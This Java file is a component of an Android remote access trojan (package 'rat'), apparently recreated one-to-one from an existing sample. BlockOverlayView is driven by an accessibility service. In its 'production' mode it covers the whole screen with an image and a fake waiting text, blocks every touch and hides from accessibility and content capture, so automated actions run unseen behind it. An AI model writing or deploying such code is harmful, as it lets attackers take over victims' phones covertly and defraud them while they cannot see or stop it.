package com.vendor.rat.helper;

import android.graphics.Color;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.view.MotionEvent;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.ImageView;

import com.vendor.rat.service.MyAccessibilityService;

import java.lang.ref.WeakReference;

/**
 * Vendor: e0.g (外层容器) — 一比一复刻 + 生产模式扩展
 *
 * 调试模式 (debug=1): 透明背景，可观察底层自动化操作
 *
 * 生产模式 (debug=0): FrameLayout 层叠布局 (参考 GuideDialogHelper)
 *   Layer 0: ImageView (背景图, CENTER_CROP, 全屏)
 *   Layer 1: View (半透明遮罩, 全屏)
 *   Layer 2: BlockOverlayInner (进度条+文字)
 *   + 拦截所有触摸事件
 */
public final class BlockOverlayView extends FrameLayout {

    // vendor: f311a — WeakReference 指向内层 (e0.i)
    public WeakReference<View> f311a;

    /** 遮挡模式: true = 背景图+触控拦截 (生产), false = 透明 (调试) */
    private final boolean blockingMode;

    /**
     * 调试模式构造器 — 透明背景，可观察自动化
     */
    public BlockOverlayView(MyAccessibilityService service, String hint, Drawable drawable) {
        super(service);
        this.blockingMode = false;
        initCommon();

        if (drawable != null) {
            setBackground(drawable);
        } else {
            setBackgroundColor(0x00000000);
        }

        initInner(service, hint, false);
    }

    /**
     * 调试模式便捷构造器 (无 drawable)
     */
    public BlockOverlayView(MyAccessibilityService service, String hint) {
        this(service, hint, (Drawable) null);
    }

    /**
     * 生产模式私有构造器 — 由 production() 工厂方法调用
     */
    private BlockOverlayView(MyAccessibilityService service, String hint, int bgColor, String bgUrl) {
        super(service);
        this.blockingMode = true;
        initCommon();

        setBackgroundColor(bgColor);

        // Layer 0: 背景图 (ImageView, CENTER_CROP, MATCH_PARENT)
        ImageView bgImageView = new ImageView(service);
        bgImageView.setScaleType(ImageView.ScaleType.CENTER_CROP);
        bgImageView.setBackgroundColor(bgColor);
        addView(bgImageView, new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT));

        BlockImageLoader.loadImage(service, bgUrl, "default_bg.png", bgImageView);

        // Layer 1: 半透明遮罩层 (降低背景图亮度，确保文字可读)
        View dimOverlay = new View(service);
        dimOverlay.setBackgroundColor(Color.argb(100, 0, 0, 0));
        addView(dimOverlay, new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT));

        // Layer 2: 内容层 (进度条+文字)
        initInner(service, hint, true);
    }

    /**
     * 生产模式工厂方法 — 调用方已解析 config，View 不依赖 MainApplication
     *
     * @param bgColor 背景色 (已解析，如 GuideDialogHelper.COLOR_BG)
     * @param bgUrl   背景图 URL (空=assets/default_bg.png, http=异步下载, 本地路径=直接加载)
     */
    public static BlockOverlayView production(MyAccessibilityService service, String hint,
                                               int bgColor, String bgUrl) {
        return new BlockOverlayView(service, hint, bgColor, bgUrl);
    }

    private void initCommon() {
        setSystemUiVisibility(4); // SYSTEM_UI_FLAG_FULLSCREEN
        setImportantForAccessibility(2); // IMPORTANT_FOR_ACCESSIBILITY_NO
        if (Build.VERSION.SDK_INT >= 30) {
            setImportantForContentCapture(2);
        }
    }

    private void initInner(MyAccessibilityService service, String hint, boolean blocking) {
        if (hint == null || hint.isEmpty()) {
            return;
        }
        BlockOverlayInner inner = new BlockOverlayInner(service, hint, blocking);
        inner.setTag("waiting-block-view");
        addView(inner, new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT));
        this.f311a = new WeakReference<>((View) inner);
    }

    // ============ 生产模式触控拦截 ============

    @Override
    public boolean onInterceptTouchEvent(MotionEvent ev) {
        return blockingMode || super.onInterceptTouchEvent(ev);
    }

    @Override
    public boolean onTouchEvent(MotionEvent event) {
        if (blockingMode) {
            return true;
        }
        return super.onTouchEvent(event);
    }
}
